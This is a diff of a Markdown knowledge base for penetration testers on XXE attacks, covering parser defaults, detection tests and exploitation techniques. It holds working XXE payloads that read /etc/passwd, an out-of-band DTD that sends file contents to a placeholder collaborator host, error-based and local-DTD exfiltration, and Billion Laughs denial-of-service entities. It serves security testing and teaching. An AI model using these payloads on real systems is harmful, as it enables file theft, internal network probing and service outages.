@@ -1,8 +1,8 @@
----
-title: XXE Exploitation Knowledge Base
+-----
+
+## title: XXE Exploitation Knowledge Base
 excerpt: XXE attack taxonomy, parser behaviour, exploitation model, identification, LFI, SSRF/OOB, error-based, blind XXE, SOAP, file upload, XInclude, PHP wrappers, Java protocols and advanced DTD techniques.
 tags: XXE, XML, SSRF, LFI, OOB, DTD, Blind XXE, SOAP
----
 
 # XML Fundamentals
 
@@ -52,7 +52,7 @@ In this example the DTD defines that a `note` element must contain `to`, `from` 
 
 ## What are Entities
 
-Entities are like variables in XML. You define them in the DTD and reference them in the document body. When the parser encounters an entity reference it replaces it with the entity's value.
+Entities are like variables in XML. You define them in the DTD and reference them in the document body. When the parser encounters an entity reference it replaces it with the entity’s value.
 
 ```xml
 <?xml version="1.0"?>
@@ -62,7 +62,7 @@ Entities are like variables in XML. You define them in the DTD and reference the
 <greeting>Hello &name;!</greeting>
 ```
 
-When parsed, `&name;` gets replaced with "World", so the result is "Hello World!".
+When parsed, `&name;` gets replaced with “World”, so the result is “Hello World!”.
 
 There are two types of entities that matter for XXE:
 
@@ -74,7 +74,7 @@ There are two types of entities that matter for XXE:
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ```
 
-This tells the parser: "go read the file `/etc/passwd` and use its contents as the value of this entity". This is where XXE attacks come from. If the parser obeys this instruction, the attacker can read any file the server has access to.
+This tells the parser: “go read the file `/etc/passwd` and use its contents as the value of this entity”. This is where XXE attacks come from. If the parser obeys this instruction, the attacker can read any file the server has access to.
 
 ## What are Parameter Entities
 
@@ -97,14 +97,14 @@ Why do they matter? Because parameter entities can define other entities. This c
 When the parser encounters `<!ENTITY xxe SYSTEM "file:///etc/passwd">` followed by `&xxe;` in the document, it does the following:
 
 1. Reads the DOCTYPE and registers the entity `xxe` with its SYSTEM identifier
-2. When it encounters `&xxe;` in the document body, looks up the entity
-3. Sees the `SYSTEM` keyword and attempts to fetch `file:///etc/passwd`
-4. Reads the file content and substitutes it in place of `&xxe;`
-5. Continues parsing the document with the substituted content
+1. When it encounters `&xxe;` in the document body, looks up the entity
+1. Sees the `SYSTEM` keyword and attempts to fetch `file:///etc/passwd`
+1. Reads the file content and substitutes it in place of `&xxe;`
+1. Continues parsing the document with the substituted content
 
 The vulnerability is at step 3. The parser fetches whatever resource the entity points to without questioning whether it should. If the attacker controls the XML input, they control what the parser fetches.
 
----
+-----
 
 # Context of XXE
 
@@ -124,9 +124,10 @@ An XML External Entity attack is a type of attack against an application that pa
  </userInfo>
 ```
 
-In this example the attacker is defining the entity "example", assigning the value "Doe" to it and then reflecting it in the "lastName" element.
+In this example the attacker is defining the entity “example”, assigning the value “Doe” to it and then reflecting it in the “lastName” element.
 
 **Example of external entity**:
+
 ```XML
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
@@ -136,13 +137,13 @@ In this example the attacker is defining the entity "example", assigning the val
  </userInfo>
 ```
 
-In this example the attacker is defining "example" and assigning the content of "/etc/passwd" as the value. In an ideal situation the content of the file will be printed.
+In this example the attacker is defining “example” and assigning the content of “/etc/passwd” as the value. In an ideal situation the content of the file will be printed.
 
 ## Requirements
 
 XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Many XML parsers by default require the developer to limit their capabilities by setting different flags in the component that uses it.
 
----
+-----
 
 # XXE Taxonomy
 
@@ -197,7 +198,7 @@ XXE ATTACK TAXONOMY
 
 **Legend**: `[CORE]` = common, first to try | `[INT]` = intermediate, context-dependent | `[ADV]` = advanced, rare conditions
 
----
+-----
 
 # Parser Behaviour
 
@@ -217,7 +218,7 @@ Understanding these failure modes is critical because many of the advanced techn
 
 Historically, many XML parsers shipped with external entity resolution enabled because the XML specification requires it for full DTD support. The spec was designed in an era where XML documents were trusted and the ability to include external resources was considered a feature not a risk.
 
-In some ecosystems this is still the case. Java parsers in particular remain insecure by default and OWASP still documents that most common Java XML parsers must be explicitly hardened. However, modern runtimes in other languages have improved their defaults considerably: Python's `lxml` has been safe since version 5.x, .NET changed to secure defaults in 4.5.2, PHP requires explicit `LIBXML_NOENT` flag to enable entity substitution, and Ruby's Nokogiri treats documents as untrusted by default.
+In some ecosystems this is still the case. Java parsers in particular remain insecure by default and OWASP still documents that most common Java XML parsers must be explicitly hardened. However, modern runtimes in other languages have improved their defaults considerably: Python’s `lxml` has been safe since version 5.x, .NET changed to secure defaults in 4.5.2, PHP requires explicit `LIBXML_NOENT` flag to enable entity substitution, and Ruby’s Nokogiri treats documents as untrusted by default.
 
 This means the vulnerability is an opt-out problem in some stacks (Java) but closer to opt-in in others (modern PHP, Python, .NET). The practical implication for pentesting is that the technology stack matters a lot when assessing XXE likelihood. Legacy applications and older framework versions remain the most common targets.
 
@@ -227,159 +228,133 @@ Different parsers behave differently. Some are vulnerable by default, some requi
 
 **Java** — All parsers vulnerable by default, must be hardened explicitly.
 
-| Parser | External Entities | Parameter Entities | DTD Processing |
-|--------|------------------|--------------------|----------------|
-| `DocumentBuilderFactory` | ✅ On by default | ✅ On by default | ✅ On |
-| `SAXParserFactory` | ✅ On by default | ✅ On by default | ✅ On |
-| `XMLReader` | ✅ On by default | ✅ On by default | ✅ On |
+|Parser                  |External Entities|Parameter Entities|DTD Processing|
+|------------------------|-----------------|------------------|--------------|
+|`DocumentBuilderFactory`|✅ On by default  |✅ On by default   |✅ On          |
+|`SAXParserFactory`      |✅ On by default  |✅ On by default   |✅ On          |
+|`XMLReader`             |✅ On by default  |✅ On by default   |✅ On          |
 
 **Python** — Defaults vary significantly by parser.
 
-| Parser | External Entities | Parameter Entities | DTD Processing | Risk Assessment |
-|--------|------------------|--------------------|----------------|-----------------|
-| `lxml` (etree) | ❌ Off by default | ❌ Off | ✅ On | Usually safe — secure defaults since 5.x |
-| `xml.etree.ElementTree` | ❌ No DTD support | ❌ No | ❌ No | Usually safe — limited parser, relies on expat |
-| `xml.dom.minidom` | ⚠️ Depends on SAX config | ❌ No | ⚠️ Partial | Version-dependent — underlying SAX parser behavior varies |
+|Parser                 |External Entities      |Parameter Entities|DTD Processing|Risk Assessment                                          |
+|-----------------------|-----------------------|------------------|--------------|---------------------------------------------------------|
+|`lxml` (etree)         |❌ Off by default       |❌ Off             |✅ On          |Usually safe — secure defaults since 5.x                 |
+|`xml.etree.ElementTree`|❌ No DTD support       |❌ No              |❌ No          |Usually safe — limited parser, relies on expat           |
+|`xml.dom.minidom`      |⚠️ Depends on SAX config|❌ No              |⚠️ Partial     |Version-dependent — underlying SAX parser behavior varies|
 
 **PHP** — External entities require explicit opt-in via `LIBXML_NOENT`.
 
-| Parser | External Entities | Parameter Entities | DTD Processing |
-|--------|------------------|--------------------|----------------|
-| `SimpleXML` | ⚠️ Off unless `LIBXML_NOENT` | ❌ Off | ✅ On |
-| `DOMDocument` | ⚠️ Off unless `LIBXML_NOENT` | ❌ Off | ✅ On |
+|Parser       |External Entities          |Parameter Entities|DTD Processing|
+|-------------|---------------------------|------------------|--------------|
+|`SimpleXML`  |⚠️ Off unless `LIBXML_NOENT`|❌ Off             |✅ On          |
+|`DOMDocument`|⚠️ Off unless `LIBXML_NOENT`|❌ Off             |✅ On          |
 
-**\.NET** — Defaults changed in version 4.5.2.
+**.NET** — Defaults changed in version 4.5.2.
 
-| Parser | External Entities | Parameter Entities | DTD Processing | Risk Assessment |
-|--------|------------------|--------------------|----------------|-----------------|
-| `XmlDocument` | ⚠️ Changed across versions | ⚠️ Varies | ✅ On | Version-dependent — < 4.5.2 vulnerable, ≥ 4.5.2 safe unless XmlResolver set |
-| `XDocument` | ❌ Off by default | ❌ Off | ✅ On | Usually safe — since .NET 4.5.2 |
+|Parser       |External Entities        |Parameter Entities|DTD Processing|Risk Assessment                                                            |
+|-------------|-------------------------|------------------|--------------|---------------------------------------------------------------------------|
+|`XmlDocument`|⚠️ Changed across versions|⚠️ Varies          |✅ On          |Version-dependent — < 4.5.2 vulnerable, ≥ 4.5.2 safe unless XmlResolver set|
+|`XDocument`  |❌ Off by default         |❌ Off             |✅ On          |Usually safe — since .NET 4.5.2                                            |
 
 **Ruby** — Both parsers default to safe behavior.
 
-| Parser | External Entities | Parameter Entities | DTD Processing | Risk Assessment |
-|--------|------------------|--------------------|----------------|-----------------|
-| `Nokogiri` | ❌ Off by default | ❌ Off | ✅ On | Usually safe — treats documents as untrusted by default |
-| `REXML` | ⚠️ Partial support | ❌ No | ⚠️ Partial | Version-dependent — partial and inconsistent support |
+|Parser    |External Entities|Parameter Entities|DTD Processing|Risk Assessment                                        |
+|----------|-----------------|------------------|--------------|-------------------------------------------------------|
+|`Nokogiri`|❌ Off by default |❌ Off             |✅ On          |Usually safe — treats documents as untrusted by default|
+|`REXML`   |⚠️ Partial support|❌ No              |⚠️ Partial     |Version-dependent — partial and inconsistent support   |
 
 **C/C++** — libxml2 requires explicit flags to enable entity resolution.
 
-| Parser | External Entities | Parameter Entities | DTD Processing |
-|--------|------------------|--------------------|----------------|
-| `libxml2` | ⚠️ Off unless flags set | ⚠️ Off unless flags | ✅ On |
+|Parser   |External Entities     |Parameter Entities|DTD Processing|
+|---------|----------------------|------------------|--------------|
+|`libxml2`|⚠️ Off unless flags set|⚠️ Off unless flags|✅ On          |
 
 Key observations from a pentesting perspective:
 
 - Historically Java XML parsers have required explicit hardening and many frameworks still rely on insecure defaults. If the target runs Java, XXE should be high on the testing list.
 - PHP requires the `LIBXML_NOENT` flag to enable entity substitution. The vulnerability often comes from developers explicitly enabling it or from legacy code that predates current best practices.
 - .NET changed defaults in version 4.5.2. Applications running on older .NET frameworks or using custom `XmlResolver` configurations are likely vulnerable.
-- Python's `lxml` has been safe by default for years but `xml.dom.minidom` behavior depends on the underlying SAX parser configuration which may vary.
-- Ruby's Nokogiri treats documents as untrusted by default, making XXE unlikely unless the developer overrides this behavior.
+- Python’s `lxml` has been safe by default for years but `xml.dom.minidom` behavior depends on the underlying SAX parser configuration which may vary.
+- Ruby’s Nokogiri treats documents as untrusted by default, making XXE unlikely unless the developer overrides this behavior.
 
 ## Protocols Supported by Parsers
 
 Not all parsers support the same protocols. This directly affects what techniques are available:
 
-| Protocol | Java | PHP | .NET | Python | Ruby |
-|----------|------|-----|------|--------|------|
-| `file://` | ✅ | ✅ | ✅ | ✅ | ✅ |
-| `http://` | ✅ | ✅ | ✅ | ✅ | ✅ |
-| `https://` | ✅ | ✅ | ✅ | ✅ | ✅ |
-| `ftp://` | ✅ | ✅ | ⚠️ | ❌ | ❌ |
-| `jar://` | ✅ | ❌ | ❌ | ❌ | ❌ |
-| `netdoc://` | ⚠️ Some | ❌ | ❌ | ❌ | ❌ |
-| `php://` | ❌ | ✅ | ❌ | ❌ | ❌ |
-| `expect://` | ❌ | ⚠️ Extension | ❌ | ❌ | ❌ |
-| `data://` | ❌ | ✅ | ❌ | ❌ | ❌ |
-| `gopher://` | ❌ | ⚠️ Old versions | ❌ | ❌ | ❌ |
+|Protocol   |Java  |PHP           |.NET|Python|Ruby|
+|-----------|------|--------------|----|------|----|
+|`file://`  |✅     |✅             |✅   |✅     |✅   |
+|`http://`  |✅     |✅             |✅   |✅     |✅   |
+|`https://` |✅     |✅             |✅   |✅     |✅   |
+|`ftp://`   |✅     |✅             |⚠️   |❌     |❌   |
+|`jar://`   |✅     |❌             |❌   |❌     |❌   |
+|`netdoc://`|⚠️ Some|❌             |❌   |❌     |❌   |
+|`php://`   |❌     |✅             |❌   |❌     |❌   |
+|`expect://`|❌     |⚠️ Extension   |❌   |❌     |❌   |
+|`data://`  |❌     |✅             |❌   |❌     |❌   |
+|`gopher://`|❌     |⚠️ Old versions|❌   |❌     |❌   |
 
 Java has the broadest protocol support which is why Java-specific techniques (jar://, netdoc://, LDAP, RMI) exist. PHP has its own set of wrappers (php://, expect://, data://) that are unique to that ecosystem.
 
----
+-----
 
 # XXE Exploitation Model
 
 The following diagram represents the full exploitation model for XXE attacks. It starts from initial detection and branches into different techniques based on what the application allows and how it responds. Use this as a decision map during testing.
 
-<pre>
-                            ┌─────────────────────────┐
-                            │   APPLICATION ACCEPTS   |
-                            │       XML INPUT?        |
-                            └────────────┬────────────┘
-                                         │ Yes
-                            ┌────────────▼────────────┐
-                            │    ENTITY PROCESSING     │
-                            │       ENABLED?           │
-                            │  (Test with basic entity)│
-                            └────────────┬────────────┘
-                              ┌──────────┼──────────┐
-                              │          │          │
-                         Reflected   Error Only   Nothing
-                              │          │          │
-                   ┌──────────▼───┐  ┌───▼──────┐  ┌▼──────────────┐
-                   │  IN-BAND XXE │  │ERROR-BASED│  │  BLIND XXE    │
-                   │              │  │   XXE     │  │               │
-                   └──────┬───────┘  └────┬──────┘  └───────┬───────┘
-                          │               │                 │
-              ┌───────────┼───────┐       │        ┌────────┼────────┐
-              │           │       │       │        │        │        │
-         ┌────▼───┐  ┌───▼────┐   │  ┌───▼─────┐   |   ┌────▼────    |
-         │  LFI   │  │  SSRF  │   │  │Error msg│   |   │OOB HTTP │   |
-         │file:// │  │http:// │   │  │has file  │  │   │to own   │   │
-         │        │  │internal│   │  │contents  │  │   │server   │   │
-         └───┬────┘  └───┬────┘   │  └────┬─────┘  │   └────┬────┘   │
-             │           │        │       │        │        │        │
-    ┌────────┼────┐      │        │       │        │   ┌────┼───┐    │
-    │        │    │      │        │       │        │   │    │   │    │
-  Unix    Windows │   Internal    │    Local DTD   │  Burp  │ HTTP   │
-  files   files   │   services    │    override    │  Collab│ lstnr  │
-    │     + UNC   │   enum        │    fonts.dtd   │       │         │
-    │             │               │    docbook.dtd │       │         │
-    │        ┌────▼────────┐      │                │  ┌────▼────┐    │
-    │        │Special chars│      │                │  │OOB DNS  │    │
-    │        │in file?     │      │                │  │(if HTTP │    │
-    │        └──┬──────┬───┘      │                │  │blocked) │    │
-    │           │      │          │                │  └─────────┘    │
-    │        ┌──▼──┐ ┌─▼──────┐   |                |                 │
-    │        │CDATA│ │php://   │  │                │            ┌────▼─────┐
-    │        │wrap │ │filter   │  │                │            │SIDE-CHAN │
-    │        └─────┘ │base64  │   │                │            │(timing,  │
-    │                └────────┘   │                │            │status)   │
-    │                             │                │            └──────────┘
-    │      ┌──────────────────────┼────────────────┘
-    │      │                      │
-    │   ┌──▼───────────────────┐  │
-    │   │  ENTRY POINT         │  │
-    │   │  VARIATIONS          │  │
-    │   └──┬───────────────────┘  │
-    │      │                      │
-    │    ┌─▼───────────┐ ┌────────▼────────┐ ┌──────────────┐
-    │    │REST API     │ │File Upload      │ │XInclude      │
-    │    │(direct XML) │ │SVG/XLSX/DOCX    │ │(no DOCTYPE)  │
-    │    └─────────────┘ └─────────────────┘ └──────────────┘
-    │    ┌─────────────┐ ┌─────────────────┐ ┌──────────────┐
-    │    │SOAP         │ │Content-Type     │ │RSS/Atom      │
-    │    │Body/Header  │ │switching        │ │feeds         │
-    │    └─────────────┘ └─────────────────┘ └──────────────┘
-    │
-    │    ┌──────────────────────────────────────────────────┐
-    │    │  LANGUAGE-SPECIFIC TECHNIQUES                    │
-    │    ├──────────────────────────────────────────────────┤
-    │    │  PHP: expect:// (RCE), php://filter, data://,    │
-    │    │       zip://                                     |
-    │    │  Java: jar://, netdoc://, LDAP, RMI              │
-    │    │  .NET: UNC path NTLM capture                     │
-    │    └──────────────────────────────────────────────────┘
-    │
-    │   ┌──────────────────────────────────────────────────┐
-    │   │  DENIAL OF SERVICE                               │
-    │   ├──────────────────────────────────────────────────┤
-    │   │  Billion Laughs (recursive expansion)            │
-    │   │  Quadratic Blowup (repeated references)          │
-    │   └──────────────────────────────────────────────────┘
-</pre>
+```mermaid
+graph LR
+    A[Application accepts XML?] -->|Yes| B[Entity processing enabled?\nTest with basic entity]
+    B -->|Reflected| C[IN-BAND XXE]
+    B -->|Error only| D[ERROR-BASED XXE]
+    B -->|Nothing| E[BLIND XXE]
 
----
+    C --> F[LFI\nfile://]
+    C --> G[SSRF\nhttp://internal]
+
+    F --> F1[Unix files]
+    F --> F2[Windows files\n+ UNC]
+    F2 --> F3[Special chars\nin file?]
+    F3 --> F4[CDATA wrap]
+    F3 --> F5[php://filter\nbase64]
+
+    G --> G1[Internal\nservices enum]
+
+    D --> D1[Error msg\nhas file contents]
+    D1 --> D2[Local DTD\noverride\nfonts.dtd\ndocbook.dtd]
+
+    E --> E1[OOB HTTP\nto own server]
+    E --> E2[OOB DNS\nif HTTP blocked]
+    E --> E3[Side-channel\ntiming / status]
+
+    E1 --> E1a[Burp Collaborator]
+    E1 --> E1b[HTTP listener]
+
+    C --> EP[ENTRY POINT\nVARIATIONS]
+    D --> EP
+    E --> EP
+
+    EP --> EP1[REST API\ndirect XML]
+    EP --> EP2[File Upload\nSVG / XLSX / DOCX]
+    EP --> EP3[XInclude\nno DOCTYPE]
+    EP --> EP4[SOAP\nBody / Header]
+    EP --> EP5[Content-Type\nswitching]
+    EP --> EP6[RSS / Atom\nfeeds]
+
+    C --> LS[LANGUAGE-SPECIFIC]
+    D --> LS
+    E --> LS
+
+    LS --> LS1[PHP\nexpect:// · php://filter\ndata:// · zip://]
+    LS --> LS2[Java\njar:// · netdoc://\nLDAP · RMI]
+    LS --> LS3[.NET\nUNC NTLM capture]
+
+    C --> DOS[DENIAL OF SERVICE]
+    DOS --> DOS1[Billion Laughs\nrecursive expansion]
+    DOS --> DOS2[Quadratic Blowup\nrepeated references]
+```
+
+-----
 
 # Identifying XXE
 
@@ -415,7 +390,7 @@ Some scenarios would require further testing since the entry point of the attack
 </root>
 ```
 
-The behavior expected with this payload would be that the response contains "SUCCESS" confirming that entity processing is enabled.
+The behavior expected with this payload would be that the response contains “SUCCESS” confirming that entity processing is enabled.
 
 ### Test 2: File Inclusion (Safe File)
 
@@ -449,7 +424,7 @@ But if the response does not return anything or it does not contain the expected
 </contacts>
 ```
 
-In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This is proof enough to infer that the defined external entity "xxe" is being processed by the XML parser.
+In a real exploitation use case, this payload triggered an “Unknown protocol: sdjsd”. This is proof enough to infer that the defined external entity “xxe” is being processed by the XML parser.
 
 ### Test 4: Malformed URL Error
 
@@ -469,7 +444,7 @@ Additionally, we can also trigger errors by malforming the resource declaration 
 </contacts>
 ```
 
-In this case we can see that the URL is malformed and in the same real exploitation use case the target application returned "protocol = http host = null" meaning that the entity got properly resolved.
+In this case we can see that the URL is malformed and in the same real exploitation use case the target application returned “protocol = http host = null” meaning that the entity got properly resolved.
 
 ### Test 5: OOB Callback
 
@@ -485,14 +460,14 @@ Another method worth trying (but noisier than the ones above) is a basic OOB con
 
 ### Behavioral Analysis (No Error Output)
 
-The last and most extreme case would be that the target application does not return any error information at all and does not print the injected entities in the response. In this case we can either try an OOB connection or analyze the application behavior. Let's say the target returns 200 OK with the legitimate request and when trying to exfiltrate `/etc/passwd` returns nothing but 200 OK. The most common behavior will be that if the malicious XML triggers an error we see a 500 error. At this step we have to be very careful to avoid errors resulting from XML syntax errors. With a well-formed XML structure we can ensure that the errors come from the malicious actions we define.
+The last and most extreme case would be that the target application does not return any error information at all and does not print the injected entities in the response. In this case we can either try an OOB connection or analyze the application behavior. Let’s say the target returns 200 OK with the legitimate request and when trying to exfiltrate `/etc/passwd` returns nothing but 200 OK. The most common behavior will be that if the malicious XML triggers an error we see a 500 error. At this step we have to be very careful to avoid errors resulting from XML syntax errors. With a well-formed XML structure we can ensure that the errors come from the malicious actions we define.
 
 Pattern to look for:
 
 1. Well-formed benign XML → Returns 200 OK with normal response
-2. XML with syntax errors → Returns 500 error
-3. XXE with syntax errors → Returns 500 error
-4. XXE with valid syntax → Returns 200 OK (but no output)
+1. XML with syntax errors → Returns 500 error
+1. XXE with syntax errors → Returns 500 error
+1. XXE with valid syntax → Returns 200 OK (but no output)
 
 If you observe this pattern with well-formed XXE payloads, the vulnerability is likely blind XXE. Proceed with local DTD enumeration, error-based exfiltration or OOB data exfiltration.
 
@@ -576,7 +551,7 @@ Does the application accept XML input?
                         - Time-based side-channel detection
 ```
 
----
+-----
 
 # Core Techniques
 
@@ -594,7 +569,7 @@ XML LFI payloads usually result in the application returning the contents of the
 <foo>&xxe;</foo>
 ```
 
-In this payload, the entity "xxe" will return the content of the file `/etc/passwd` since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.
+In this payload, the entity “xxe” will return the content of the file `/etc/passwd` since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.
 
 ### Common Unix/Linux files
 
@@ -655,7 +630,7 @@ Server-Side Request Forgery (SSRF) is a web security vulnerability that allows a
 
 Up to this point, all techniques assume the server sends back the file content or error message in its response. But what happens when the application does not return anything useful? The response is a generic 200 OK or blank page, and nothing we inject shows up anywhere. This is called **blind XXE** — the vulnerability exists but we cannot see the output directly.
 
-The solution is to make the server send the data somewhere else — to a server we control. This is the "out-of-band" part: instead of reading the data in the response, we receive it on a separate channel. The XML parser's ability to fetch external resources works in our favor here because we can make it send HTTP requests that contain the stolen data in the URL.
+The solution is to make the server send the data somewhere else — to a server we control. This is the “out-of-band” part: instead of reading the data in the response, we receive it on a separate channel. The XML parser’s ability to fetch external resources works in our favor here because we can make it send HTTP requests that contain the stolen data in the URL.
 
 **Key Concept:** The parser processes the XML input and resolves entities. If an entity points to an external resource (HTTP, HTTPS, or even FTP), the parser will attempt to fetch it. We exploit this behavior to send data out-of-band.
 
@@ -665,7 +640,7 @@ The core idea is simple:
 - Reference this DTD from the vulnerable XML payload.
 - Use parameter entities in the malicious DTD to read local files and send their contents via HTTP requests.
 
-**Why parameter entities?** This is where parameter entities (covered in [XML Fundamentals](#what-are-parameter-entities)) become essential. We need to chain multiple operations: first read a file, then embed the file contents into a URL, then make the parser visit that URL. Regular entities cannot do this because they only work in the document body. Parameter entities work inside DTD declarations so we can define one entity that reads a file, then define another entity that uses the first entity's value inside a URL.
+**Why parameter entities?** This is where parameter entities (covered in [XML Fundamentals](#what-are-parameter-entities)) become essential. We need to chain multiple operations: first read a file, then embed the file contents into a URL, then make the parser visit that URL. Regular entities cannot do this because they only work in the document body. Parameter entities work inside DTD declarations so we can define one entity that reads a file, then define another entity that uses the first entity’s value inside a URL.
 
 Think of it like a pipeline: `read file → put content in URL → send HTTP request`. Each step is a parameter entity that feeds into the next one.
 
@@ -695,7 +670,7 @@ On the attacker machine, create a DTD file containing the malicious actions. In 
 - `<!ENTITY % file SYSTEM "file:///etc/passwd">` tells the parser to load the contents of `/etc/passwd` into the entity `%file`.
 - `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">` creates a new entity declaration inside `%eval`. The `&#x25;` is the escaped form of `%`, required because we are defining a parameter entity inside another entity.
 - `%eval;` expands and defines `%exfiltrate`.
-- `%exfiltrate;` triggers the HTTP request to the attacker's server, sending the file contents as part of the query string.
+- `%exfiltrate;` triggers the HTTP request to the attacker’s server, sending the file contents as part of the query string.
 
 **Why escape characters?** XML parsers enforce strict syntax rules. When nesting declarations, `%` must be escaped as `&#x25;` to avoid breaking the DTD structure.
 
@@ -756,7 +731,7 @@ For example, if the application returns error messages like these:
   "REDACTED": "REDACTED",
   "errorMessage": "/etc/invalid-file (No such file or directory)"
 }
-```  
+```
 
 ```json
 {
@@ -813,7 +788,7 @@ XML has a feature that allows expanding entities in a recursive way by referenci
 <laugh>&LOL3;</laugh>
 ```
 
-The above payload makes the XML parser expand each of the entities, generating a large number of "LOLs". This payload would generate hundreds of thousands of "LOL" strings but a full scale payload would generate literally "Billions" of "LOL" strings.
+The above payload makes the XML parser expand each of the entities, generating a large number of “LOLs”. This payload would generate hundreds of thousands of “LOL” strings but a full scale payload would generate literally “Billions” of “LOL” strings.
 
 Simpler variant (Quadratic Blowup):
 
@@ -827,7 +802,7 @@ Simpler variant (Quadratic Blowup):
 
 Both attacks cause memory exhaustion, CPU exhaustion, disk exhaustion and denial of service.
 
----
+-----
 
 # Intermediate Techniques
 
@@ -1083,7 +1058,7 @@ XInclude also supports fallback elements when the primary include fails:
 
 ## Content-Type Switching
 
-Some APIs accept multiple content types and internally convert between formats. Many parsers don't validate the actual content against the declared content-type so we can try submitting XML payloads with different headers.
+Some APIs accept multiple content types and internally convert between formats. Many parsers don’t validate the actual content against the declared content-type so we can try submitting XML payloads with different headers.
 
 ### JSON to XML
 
@@ -1148,7 +1123,7 @@ The workaround is to use error-based exfiltration or OOB techniques since errors
 
 The error message will contain the file contents including the special characters. When exfiltrating via HTTP GET requests the special characters get automatically URL-encoded in the query string which also helps.
 
----
+-----
 
 # Advanced Techniques
 
@@ -1165,21 +1140,57 @@ The goal of enumerating the filesystem is to locate **default DTD files** presen
 - Define **parameter entities** that can be overridden.
 - Allow us to inject our own entities to manipulate output and include file contents indirectly.
 
-### Common DTD Paths
+### Identifying Injectable Parameter Entities in a DTD
+
+Many system DTDs are publicly available for download. When you have access to the DTD file — either because it is distributed with a known package or available in its project repository — you can analyse it offline to find which parameter entities are safe to override.
+
+The process is straightforward. Open the DTD and look for declarations of the form `<!ENTITY % name ...>`. These are parameter entity definitions. The ones that are useful for injection are those whose value is **referenced inside other DTD declarations** — specifically inside `<!ELEMENT>` or `<!ATTLIST>` declarations. When an entity is used this way, redefining it before the DTD loads lets you inject arbitrary content into the declaration that references it.
+
+To find candidates quickly, grep for `%name;` patterns (where `name` matches a defined parameter entity) inside the body of other declarations:
+
+```bash
+grep -n 'ENTITY %' fonts.dtd          # list all parameter entity definitions
+grep -n '%[a-z]' fonts.dtd            # list all parameter entity references
+```
+
+Cross-referencing the two outputs shows which defined entities are actually used inside declarations — those are your injection points. In `fonts.dtd` for example, `%expr;` appears inside an `<!ELEMENT>` declaration, which is why overriding it with a payload that breaks out of the element syntax and injects new entity declarations works.
+
+An injectable entity looks like this in the DTD:
+
+```
+<!ELEMENT foo (%expr;)>
+```
+
+A non-injectable one looks like this — the entity is used only in the document body context or not referenced at all after its definition:
+
+```
+<!ENTITY % version "1.0">
+```
+
+The key signal is whether `%name;` appears inside a markup declaration. If it does, it is a candidate.
+
+### Common DTD Paths — Linux
 
 ```
 /usr/share/xml/fontconfig/fonts.dtd
-/usr/share/sgml/docbook/ent/iso8879/ISOtech.ent
 /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
-/usr/share/xml/docbook/custom/dtds/4.5/docbookx.dtd
 /usr/share/xml/xhtml/xhtml11-flat.dtd
-/usr/share/xml/html/xhtml11-flat.dtd
-/usr/share/iso8879/iso8879.ent
 /usr/share/xml/svg11/svg11-flat.dtd
-/opt/java/openjdk/conf/dtds/
-/usr/share/java/*/dtds/
+/usr/share/sgml/docbook/ent/iso8879/ISOtech.ent
+/usr/share/iso8879/iso8879.ent
 /etc/xml/catalog
 /usr/local/etc/xml/catalog
+```
+
+### Common DTD Paths — Windows
+
+```
+C:\Windows\System32\wbem\xml\cim20.dtd
+C:\Windows\System32\wbem\xml\cim10.dtd
+C:\Program Files\Common Files\Microsoft Shared\OFFICE16\Cultures\OFFICE.ODF
+C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroIEHelper.dtd
+C:\Program Files\Java\jdk*\lib\dtds\*.dtd
+C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd
 ```
 
 To check if a DTD exists we load it and check the parser response:
@@ -1208,7 +1219,7 @@ Error-based feedback indicates successful DTD loading. If we get a different err
 ```
 
 - **Step 2:** Override Parameter Entities:
-`fonts.dtd` defines entities like `%expr` that can be overridden. We redefine them to include our malicious logic:
+  `fonts.dtd` defines entities like `%expr` that can be overridden. We redefine them to include our malicious logic:
 
 ```xml
 <!DOCTYPE message [
@@ -1226,11 +1237,11 @@ Error-based feedback indicates successful DTD loading. If we get a different err
 **Explanation:**
 
 1. `%file` loads the contents of `/etc/passwd` from the local filesystem.
-2. `%eval` creates a new parameter entity `%error` that references a non-existent file path concatenated with `%file` content.
-3. When the parser expands `%error`, it attempts to resolve the invalid path, triggering an error message that includes the contents of `/etc/passwd`.
+1. `%eval` creates a new parameter entity `%error` that references a non-existent file path concatenated with `%file` content.
+1. When the parser expands `%error`, it attempts to resolve the invalid path, triggering an error message that includes the contents of `/etc/passwd`.
 
 - **Step 3:** Trigger Error-Based Exfiltration:
-If the application returns error messages, the response will include something like:
+  If the application returns error messages, the response will include something like:
 
 ```
 errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"
@@ -1246,26 +1257,25 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
 - All markup declarations (`<!ELEMENT>`, `<!ENTITY>`) must appear in a proper order.
 - If the included DTD (`%local_dtd;`) contains markup declarations, use a **dummy element** (e.g., `<!ELEMENT aa (bb'>`) to absorb conflicts and prevent parser errors.
 
-2. **Correct Entity Nesting and Escaping**
+1. **Correct Entity Nesting and Escaping**
 
 - Nested entity declarations inside another entity must be properly escaped:
-  * Use `&#x25;` for `%`, `&#x26;` for `&` and `&#x27;` for  quotes.
-  * **Example**:
-
+  - Use `&#x25;` for `%`, `&#x26;` for `&` and `&#x27;` for quotes.
+  - **Example**:
+    
     ```xml
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///path/%file;'>">
     ```
-
 - Failure to escape these characters often results in **markup declaration errors**.
 
-3. **Order of Expansion**
+1. **Order of Expansion**
 
 - Define and expand entities in the correct sequence:
 - Override entities first.
 - Expand `%eval;` and `%error;` before including `%local_dtd;`.
 - Incorrect ordering can cause the parser to reject the payload.
 
-4. **Include a Structural Padding**
+1. **Include a Structural Padding**
 
 - When including external DTDs, add a placeholder declaration like:
 
@@ -1275,11 +1285,11 @@ Creating a working payload for local DTD-based XXE exploitation requires careful
 
 - This prevents syntax conflicts when the external DTD introduces new declarations.
 
-5. **Use Parameter Entities for Injection**
